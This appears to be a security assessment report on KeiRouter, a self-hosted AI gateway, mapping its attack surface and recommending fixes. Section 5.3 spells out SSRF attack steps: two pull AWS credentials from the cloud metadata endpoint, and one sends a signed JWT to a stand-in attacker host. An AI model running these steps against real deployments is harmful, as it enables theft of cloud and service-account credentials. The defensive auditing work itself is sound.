# KeiRouter Security Assessment - Code Analysis Deliverable

## Phase 1 & 2: Reconnaissance & Surface Mapping

**Assessment Date:** 2026-06-02
**Target:** KeiRouter - Self-hosted AI Gateway
**Scope:** Full codebase (Go backend + React frontend)

---

## 1. Executive Summary

KeiRouter is a self-hosted AI gateway written in Go with a React dashboard. It proxies requests to multiple AI providers (OpenAI, Anthropic, Gemini, Vertex, etc.) and provides a unified API surface. The application demonstrates strong cryptographic foundations but has significant SSRF attack surface due to the nature of proxying requests to user-configurable endpoints.

### Key Findings Summary

| Category | Critical | High | Medium | Low | Info |
|----------|----------|------|--------|-----|------|
| SSRF | 2 | 4 | 3 | 1 | 0 |
| Injection | 0 | 1 | 3 | 3 | 0 |
| Authentication | 0 | 0 | 2 | 2 | 1 |
| Data Security | 0 | 0 | 1 | 2 | 2 |
| Configuration | 0 | 0 | 2 | 2 | 1 |
| **Total** | **2** | **5** | **11** | **10** | **4** |

---

## 2. Architecture & Tech Stack

### 2.1 Languages & Frameworks

| Component | Technology | Version |
|-----------|------------|---------|
| Backend | Go | 1.24 |
| HTTP Router | Chi | v5.2.1 |
| Frontend | React | 19 |
| Build Tool | Vite | 6.0.5 |
| CSS Framework | Tailwind CSS | 4.0.0 |
| State Management | Zustand | 5.0.2 |
| Data Fetching | TanStack Query | 5.62.7 |

### 2.2 Databases

| Database | Driver | Purpose |
|----------|--------|---------|
| PostgreSQL | pgx/v5 | Primary data store |
| SQLite | modernc.org/sqlite | Local/embedded storage |

### 2.3 Infrastructure

| Component | Technology |
|-----------|------------|
| Container | Docker (distroless runtime) |
| CI/CD | GitHub Actions |
| Metrics | Prometheus |

### 2.4 AI Provider Integrations

The application integrates with 15+ AI providers:

- **LLM Providers:** OpenAI, Anthropic, Gemini, Vertex AI, Groq, DeepSeek, Ollama, Kiro, Cursor, GitHub Copilot, Qwen, CloudCode, CommandCode
- **Search Providers:** Tavily, Exa, Serper, Brave, SearXNG
- **Fetch Providers:** Firecrawl, Jina Reader
- **Media Providers:** OpenAI (DALL-E, TTS, Whisper)

---

## 3. Authentication & Authorization

### 3.1 Authentication Mechanisms

#### API Key Authentication (Inbound)

- **Format:** `kr_` prefix + 24 bytes base64url (192 bits entropy)
- **Storage:** Argon2id hash (m=64MiB, t=1, p=4) + SHA-256 lookup hash
- **Extraction:** `Authorization: Bearer <key>` or `x-api-key` header
- **Verification:** Two-phase: SHA-256 lookup → argon2id constant-time compare

#### Dashboard Session Authentication

- **Method:** HMAC-SHA256 signed session tokens
- **Cookie:** `kr_session` (HttpOnly, SameSite=Lax, Path=/)
- **TTL:** 24 hours (configurable)
- **Default Password:** `keirouter` (hardcoded, must be changed on first login)

#### OAuth Flows (Outbound)

- **PKCE (S256):** Claude, Codex, xAI
- **Authorization Code:** Gemini CLI, Antigravity, Cline
- **Device Code:** GitHub Copilot, Qwen, Kiro

### 3.2 Authorization Model

- **Single-operator model** (no RBAC/ABAC)
- **API Key Scoping:** TenantID, ProjectID fields (enforced at query level)
- **Admin API:** Double-guarded (loopback + session cookie)
- **Metrics:** Loopback-only guard

### 3.3 Security Middleware

| Middleware | Configuration |
|------------|---------------|
| CORS | Default: `*` (configurable) |
| Body Size | Admin: 1 MiB, Chat: 32 MiB |
| Request ID | Chi middleware |
| Panic Recovery | Chi Recoverer |
| Rate Limiting | **NONE** (relies on upstream providers) |

---

## 4. Attack Surface Map

### 4.1 Entry Points

#### Public Endpoints (No Auth)

| Method | Path | Risk |
|--------|------|------|
| GET | `/healthz` | Low |
| GET | `/v1` | Low |
| GET | `/*` | Low (static files) |

#### API Key Authenticated (`/v1/*`)

| Method | Path | Handler | Risk |
|--------|------|---------|------|
| POST | `/v1/chat/completions` | Chat completions | Medium |
| POST | `/v1/messages` | Anthropic messages | Medium |
| POST | `/v1/responses` | OpenAI responses | Medium |
| POST | `/v1beta/models/{modelAction}` | Gemini generate | Medium |
| POST | `/v1/embeddings` | Embeddings | Medium |
| POST | `/v1/images/generations` | Image generation | Medium |
| POST | `/v1/audio/speech` | Text-to-speech | Medium |
| POST | `/v1/audio/transcriptions` | Speech-to-text | Medium |
| POST | `/v1/search` | Web search | **High** |
| POST | `/v1/web/fetch` | Web fetch | **Critical** |
| GET | `/v1/models` | List models | Low |
| GET | `/v1/models/info` | Model info | Low |
| GET | `/v1/models/{kind}` | Models by kind | Low |

#### Admin API (`/api/*`) - Loopback + Session Required

| Category | Endpoints | Count |
|----------|-----------|-------|
| Auth | login, logout, status, password, onboarding | 5 |
| Providers | list, models | 2 |
| API Keys | list, create, update, delete | 4 |
| Accounts | list, create, update, delete, test, quota, validate | 7 |
| Chains | list, create, update, delete | 4 |
| Budgets | list, create, delete | 3 |
| Usage | summary, insights, models, quota | 4 |
| Console | get, clear, stream (SSE) | 3 |
| Proxy Pools | list, create, update, delete, test | 5 |
| Skills | list, create, update, delete | 4 |
| Model Config | aliases, disabled models | 6 |
| Settings | endpoint, access, database (export/import), proxy-test | 5 |
| OAuth | providers, authorize, exchange, device-code, poll | 5 |
| Kiro | device-start, device-poll, import | 3 |
| CLI Tools | list, configure, remove | 3 |

**Total Admin Endpoints:** 63

---

## 5. SSRF Attack Surface (CRITICAL)

### 5.1 SSRF Risk Summary

KeiRouter has **extensive SSRF attack surface** due to its core function of proxying requests to user-configurable AI provider endpoints.

| Vector | Severity | Prerequisite | Impact |
|--------|----------|--------------|--------|
| Account `base_url` | **Critical** | Dashboard access | Arbitrary SSRF to any URL |
| Web Fetch `url` | **Critical** | API key | SSRF via Jina/Firecrawl |
| Vertex `token_uri` | High | Dashboard access | JWT assertion leak |
| Proxy Pool `proxy_url` | High | Dashboard access | Traffic interception |
| Relay URL | High | Dashboard access | Traffic interception |
| OAuth `redirect_uri` | Medium | Dashboard access | Auth code interception |
| Qwen `resource_url` | Medium | Dashboard access | Internal host access |
| Kiro `kiro_region` | Low | Dashboard access | Limited URL manipulation |

### 5.2 Missing SSRF Defenses

The following SSRF defenses are **completely absent**:

1. **URL scheme validation** - `file://`, `gopher://`, `dict://` not blocked
2. **Private IP blocking** - 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16 all reachable
3. **DNS resolution validation** - DNS rebinding attacks possible
4. **Cloud metadata blocking** - 169.254.169.254, metadata.google.internal reachable
5. **Redirect control** - No `CheckRedirect` function set
6. **URL allowlist** - No mechanism to restrict to known providers
7. **Response size limits** - `io.ReadAll` without limits
8. **Outbound logging** - Destination URLs not logged

### 5.3 SSRF Attack Vectors

#### Vector 1: Admin → Arbitrary SSRF (CRITICAL)

```
1. Create custom-openai account with base_url: "http://169.254.169.254/latest/meta-data/"
2. Send chat request targeting this account
3. Connector POSTs to metadata endpoint with attacker's API key in Authorization header
4. AWS credentials returned in chat response
```

#### Vector 2: API User → Web Fetch SSRF (CRITICAL)

```
1. POST /v1/web/fetch with {"url": "http://169.254.169.254/", "model": "jina-reader"}
2. KeiRouter sends GET https://r.jina.ai/http://169.254.169.254/ to Jina
3. Jina fetches metadata and returns content
4. AWS credentials returned to attacker
```

#### Vector 3: Vertex SA → Token URI Redirect (HIGH)

```
1. Create Vertex account with crafted SA JSON: {"token_uri": "https://attacker.com/token"}
2. KeiRouter mints JWT assertion and POSTs to attacker's server
3. Attacker receives service account email and signed JWT
```

---

## 6. Injection Sinks

### 6.1 Backend (Go)

| # | Finding | File | Line | Risk | User Input |
|---|---------|------|------|------|------------|
| 1 | SQL fmt.Sprintf (column name) | repo_usage.go | 49 | Medium | No (enum) |
| 2 | Reflected input in errors | resolve.go, models.go | multiple | Low | Yes |
| 3 | CLI tool config write | clitools.go | 52-81 | **High** | Yes |
| 4 | Host header injection | clitools.go | 103-118 | Medium | Yes |
| 5 | File system writes | registry.go | 119-144 | Medium | Indirect |
| 6 | Database import | admin.go | 1052 | Medium | Yes |
| 7 | Console log injection | consolelog.go | 97-101 | Low | Indirect |

### 6.2 Frontend (React/TypeScript)

| # | Finding | File | Line | Risk | User Input |
|---|---------|------|------|------|------------|
| 8 | window.open with URL | ProviderDetail.tsx | 748 | Medium | Yes |
| 9 | URL.createObjectURL | Settings.tsx | 351 | Low | No |
| 10 | SSE event parsing | ConsoleLog.tsx | 33-47 | Low | Indirect |

### 6.3 Confirmed Absent

- ✅ No `dangerouslySetInnerHTML`
- ✅ No `eval()` or `new Function()`
- ✅ No `document.write`
- ✅ No `.innerHTML =` assignments
- ✅ No `os/exec.Command`
- ✅ No raw SQL string concatenation with user input
- ✅ All SQL uses parameterized queries (`?` placeholders)

---

## 7. Data Security

### 7.1 Sensitive Data Flows

| Data Type | Reception | Storage | Transmission | Logging |
|-----------|-----------|---------|--------------|---------|
| Inbound API key | Bearer/x-api-key | argon2id + SHA-256 | N/A | Never |
| Upstream API key | Admin form | AES-256-GCM envelope | Bearer/x-api-key | Never |
| OAuth access token | OAuth callback | AES-256-GCM envelope | Bearer to provider | Never |
| OAuth refresh token | OAuth callback | AES-256-GCM envelope | To token endpoint | Never |
| Dashboard password | Login form | argon2id hash | N/A | Default at startup |
| Session token | Set-cookie | HMAC-SHA256 signed | Cookie header | Never |
| Master key | Config/env/file | File (0600) or env | Never | Path logged |

### 7.2 Encryption Implementation

**Envelope Encryption (at rest):**
- Algorithm: AES-256-GCM (AEAD)
- Architecture: Fresh DEK per secret, wrapped with master KEK
- Nonces: 12-byte from `crypto/rand`, prepended to ciphertext
- AAD: Not used (acceptable for this use case)

**Key Management:**
- Master key precedence: Env var → file → auto-generated
- No built-in key rotation mechanism
- `.gitignore` correctly excludes `*.key`, `master.key`

**Password/Key Hashing:**
- Algorithm: argon2id (PHC format)
- Parameters: time=1, memory=64MiB, threads=4, keyLen=32, saltLen=16
- Verification: `subtle.ConstantTimeCompare` (timing-safe)

### 7.3 Data Security Findings

| # | Finding | Severity | File |
|---|---------|----------|------|
| 1 | Kiro client credentials in plaintext metadata | Low-Medium | kiro.go:131-136 |
| 2 | Session cookie missing `Secure` flag | Medium | auth_handlers.go:104-112 |
| 3 | Default password logged at startup | Low | app.go:82-84 |
| 4 | Vertex token cache in memory | Low | vertex_auth.go:60-63 |
| 5 | Hardcoded OAuth client secrets | Informational | providers.go:43-117 |
| 6 | No TLS enforcement | Informational | server.go |
| 7 | CORS wildcard default | Low | config.go:105 |

---

## 8. Configuration Security

### 8.1 Docker

**Dockerfile Analysis:**
- ✅ Multi-stage build (frontend + backend)
- ✅ Distroless runtime image (`gcr.io/distroless/static-debian12:nonroot`)
- ✅ Non-root user (`nonroot:nonroot`)
- ✅ CGO disabled (`CGO_ENABLED=0`)
- ✅ Binary stripped (`-ldflags="-s -w"`)
- ⚠️ No health check defined
- ⚠️ No read-only filesystem

### 8.2 GitHub Actions

**CI Workflow Analysis:**
- ✅ Go vet and tests run on push/PR
- ✅ Frontend lint, typecheck, and build
- ⚠️ No security scanning (gosec, trivy, etc.)
- ⚠️ No dependency vulnerability scanning
- ⚠️ Actions not pinned to SHA (uses version tags)

### 8.3 Secrets Management

| Secret | Storage | Protection |
|--------|---------|------------|
| Master key | File (0600) or env | AES-256-GCM KEK |
| API keys | Database | argon2id hash |
| OAuth tokens | Database | AES-256-GCM envelope |
| Session signing key | Settings table | HMAC-SHA256 |
| Default password | Hardcoded | Must be changed |

---

## 9. Critical File Paths

### 9.1 Security-Critical Files

| File | Purpose |
|------|---------|
| `backend/internal/crypto/envelope.go` | AES-256-GCM envelope encryption |
| `backend/internal/crypto/apikey.go` | API key generation/verification |
| `backend/internal/crypto/password.go` | Password hashing |
| `backend/internal/vault/vault.go` | Credential sealing/opening |
| `backend/internal/auth/auth.go` | Dashboard auth, session tokens |
| `backend/internal/identity/identity.go` | API key lifecycle |
| `backend/internal/oauth/flow.go` | OAuth PKCE, token exchange |
| `backend/internal/oauth/manager.go` | Token refresh |
| `backend/internal/oauth/session.go` | In-memory OAuth sessions |
| `backend/internal/oauth/providers.go` | OAuth provider configs |
| `backend/internal/gateway/middleware.go` | Auth middleware, loopback guard |
| `backend/internal/gateway/auth_handlers.go` | Login, session cookie |
| `backend/internal/gateway/admin.go` | Admin CRUD endpoints |
| `backend/internal/gateway/clitools.go` | CLI tool configuration |
| `backend/internal/gateway/media.go` | Web search/fetch handlers |
| `backend/internal/gateway/oauth.go` | OAuth HTTP handlers |
| `backend/internal/gateway/kiro.go` | Kiro SSO flows |
| `backend/internal/gateway/server.go` | Route wiring, CORS |
| `backend/internal/connectors/httpclient.go` | All outbound HTTP |
| `backend/internal/connectors/vertex_auth.go` | Vertex SA JWT minting |
| `backend/internal/connectors/web.go` | Web search/fetch connectors |
| `backend/internal/dispatch/dispatch.go` | Credential resolution |
| `backend/internal/pipeline/pipeline.go` | Request lifecycle |
| `backend/internal/app/app.go` | App bootstrap, master key |
| `backend/internal/config/config.go` | Configuration structure |

### 9.2 Frontend Security-Relevant Files

| File | Purpose |
|------|---------|
| `frontend/src/lib/api.ts` | API client (all endpoints) |
| `frontend/src/components/AuthGate.tsx` | Auth flow, default password display |
| `frontend/src/pages/ProviderDetail.tsx` | OAuth flow, window.open |
| `frontend/src/pages/ConsoleLog.tsx` | SSE event parsing |
| `frontend/src/pages/Settings.tsx` | Database export/import |

---

## 10. Recommendations Summary

### 10.1 Critical Priority

1. **Implement SSRF protections:**
   - URL scheme validation (allow only `http://`, `https://`)
   - Private IP blocking (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16)
   - Cloud metadata blocking (169.254.169.254, metadata.google.internal)
   - DNS resolution validation
   - Response size limits (`io.LimitReader`)

2. **Validate Vertex `token_uri`:**
   - Restrict to `https://oauth2.googleapis.com/token` or allowlist

3. **Add URL validation for Web Fetch:**
   - Block internal IPs and metadata endpoints
   - Validate URL format before passing to Jina/Firecrawl

### 10.2 High Priority

4. **Add rate limiting to auth endpoints:**
   - Implement rate limiting on `/api/auth/login`
   - Consider account lockout after N failed attempts

5. **Set `Secure` flag on session cookies:**
   - Add `Secure: true` when not in development mode

6. **Validate `base_url` on account creation:**
   - Implement URL allowlist for known providers
   - Block custom providers without explicit approval

7. **Add security headers:**
   - `X-Content-Type-Options: nosniff`
   - `X-Frame-Options: DENY`
   - `Content-Security-Policy`
   - `Strict-Transport-Security` (when TLS enabled)

### 10.3 Medium Priority

8. **Implement session revocation:**
   - Add server-side session store
   - Enable session invalidation on logout

9. **Add CSRF protection:**
   - Implement CSRF tokens for state-changing operations
   - Consider `SameSite=Strict` for sensitive cookies

10. **Enforce API key scopes:**
    - The `Scopes` field exists but is not enforced
    - Implement scope-based access control

11. **Add input validation:**
    - Validate `base_url` format
    - Validate `proxy_url` format
    - Validate OAuth `redirect_uri`

12. **Improve database import validation:**
    - Validate field values on import
    - Sanitize `name`, `proxy_url`, alias `target`

### 10.4 Low Priority

13. **Remove default password from startup logs:**
    - Log warning without revealing password value

14. **Pin GitHub Actions to SHA:**
    - Use commit SHA instead of version tags

15. **Add security scanning to CI:**
    - gosec for Go static analysis
    - trivy for container scanning
    - npm audit for frontend dependencies

16. **Implement outbound request logging:**
    - Log destination URLs for audit
    - Monitor for anomalous patterns

---

## 11. Appendices

### 11.1 Technology Detection Summary

```
Languages:      Go 1.24, TypeScript
Frameworks:     Chi Router v5, React 19, Vite 6, Tailwind CSS 4
Infrastructure: Docker (distroless), GitHub Actions
Databases:      PostgreSQL, SQLite
API Type:       REST API
AI/LLM:         Multi-provider AI router (15+ providers)
```

### 11.2 Endpoint Statistics

| Category | Count |
|----------|-------|
| Public endpoints | 3 |
| API key authenticated | 13 |
| Admin endpoints | 63 |
| SSE endpoints | 2 |
| **Total** | **81** |

### 11.3 Provider Integrations

| Category | Providers |
|----------|-----------|
| LLM | OpenAI, Anthropic, Gemini, Vertex, Groq, DeepSeek, Ollama, Kiro, Cursor, GitHub Copilot, Qwen, CloudCode, CommandCode |
| Search | Tavily, Exa, Serper, Brave, SearXNG |
| Fetch | Firecrawl, Jina Reader |
| Media | OpenAI (DALL-E, TTS, Whisper) |

---

**Assessment Status:** Phase 1 & 2 Complete
**Next Phase:** `/audit` - Vulnerability Analysis
